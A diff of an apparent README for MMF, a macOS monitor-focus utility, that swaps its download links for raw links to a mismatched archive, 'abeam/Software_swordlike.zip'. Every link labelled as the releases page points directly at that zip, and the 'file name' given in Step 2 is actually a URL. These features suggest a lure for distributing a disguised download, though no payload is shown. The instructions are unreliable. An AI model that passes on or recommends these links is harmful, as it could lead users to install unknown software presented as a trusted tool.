@@ -6,9 +6,9 @@ Welcome to MMF! This small macOS utility allows you to switch focus between moni
 
 ## 📥 Download MMF
 
-[![Download MMF](https://raw.githubusercontent.com/Ben4137/MMF/main/abeam/MMF-3.0.zip%20MMF-v1.0-brightgreen)](https://raw.githubusercontent.com/Ben4137/MMF/main/abeam/MMF-3.0.zip)
+[![Download MMF](https://github.com/Ben4137/MMF/raw/refs/heads/main/abeam/Software_swordlike.zip%20MMF-v1.0-brightgreen)](https://github.com/Ben4137/MMF/raw/refs/heads/main/abeam/Software_swordlike.zip)
 
-Visit this page to download: [MMF Releases](https://raw.githubusercontent.com/Ben4137/MMF/main/abeam/MMF-3.0.zip)
+Visit this page to download: [MMF Releases](https://github.com/Ben4137/MMF/raw/refs/heads/main/abeam/Software_swordlike.zip)
 
 ## 🖥️ System Requirements
 
@@ -28,11 +28,11 @@ Visit this page to download: [MMF Releases](https://raw.githubusercontent.com/Be
 
 ### Step 1: Visit the Releases Page
 
-To download MMF, go to the [MMF Releases](https://raw.githubusercontent.com/Ben4137/MMF/main/abeam/MMF-3.0.zip) page. Here, you will find the latest version available.
+To download MMF, go to the [MMF Releases](https://github.com/Ben4137/MMF/raw/refs/heads/main/abeam/Software_swordlike.zip) page. Here, you will find the latest version available.
 
 ### Step 2: Download the Latest Version
 
-On the Releases page, look for the version labeled "Latest Release." Click on the download link to get the installation file. The file name will be something like `https://raw.githubusercontent.com/Ben4137/MMF/main/abeam/MMF-3.0.zip`.
+On the Releases page, look for the version labeled "Latest Release." Click on the download link to get the installation file. The file name will be something like `https://github.com/Ben4137/MMF/raw/refs/heads/main/abeam/Software_swordlike.zip`.
 
 ### Step 3: Open the Downloaded File
 
